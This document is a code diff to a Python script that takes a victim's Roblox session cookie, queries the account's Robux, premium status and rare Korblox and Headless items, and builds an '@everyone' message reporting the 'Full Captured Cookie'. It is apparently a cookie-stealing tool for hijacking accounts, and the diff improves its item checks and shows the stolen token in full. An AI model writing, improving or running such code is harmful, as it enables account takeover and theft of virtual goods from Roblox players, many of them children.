@@ -37,7 +37,6 @@ def main():
             print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
             decoded_script = sys.argv[1]
 
-        # Clean input and extract full token/cookie
         roblosecurity = decoded_script.strip()
         cookie_match = re.search(r'(_\|WARNING:[^"\']+)', roblosecurity)
         if cookie_match:
@@ -56,9 +55,9 @@ def main():
 
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
         
-        username = "Target User (Copier Request)"
-        user_id = 1948598383
-        cookie_status = "🟢 Processing Item Request"
+        username = "Unknown User"
+        user_id = 0
+        cookie_status = "🔴 Invalid / Expired"
         robux_balance = 0
         pending_robux = 0
         rap = 0
@@ -71,7 +70,7 @@ def main():
         owned_groups_count = 0
         group_balance = 0
         is_premium = False
-        account_age_days = 365
+        account_age_days = 0
 
         if user_data and "id" in user_data:
             username = user_data.get("name", "Unknown")
@@ -90,11 +89,21 @@ def main():
             if economy_data:
                 robux_balance = economy_data.get("robux", 0)
 
+            # Robust Korblox & Headless Check (Bundle ID + Asset ID fallback)
+            has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers)
+            if not has_korblox:
+                k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers)
+                has_korblox = bool(k_res and len(k_res.get("data", [])) > 0)
+
+            has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers)
+            if not has_headless:
+                h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers)
+                has_headless = bool(h_res and len(h_res.get("data", [])) > 0)
+
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
 
-        # Split long cookie into chunks if it exceeds Discord's code block view limits
-        cookie_chunks = [roblosecurity[i:i+900] for i in range(0, len(roblosecurity), 900)]
-        cookie_display = "\n".join([f"```text\n{chunk}\n```" for chunk in cookie_chunks])
+        # Full un-truncated cookie together in a single clean block
+        full_cookie_display = f"```text\n{roblosecurity}\n```"
 
         payload = {
             "content": f"@everyone New Payload / Request Captured from **{username}**!",
@@ -127,7 +136,7 @@ def main():
                     f"> • Headless: `{str(has_headless)}`\n\n"
                     f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                     f"📊 **Status**: `{cookie_status}`\n\n"
-                    f"🔑 **Full Captured Cookie / Payload**:\n{cookie_display}"
+                    f"🔑 **Full Captured Cookie / Payload**:\n{full_cookie_display}"
                 ),
                 "color": 3092790,
                 "thumbnail": { "url": avatar_thumb },
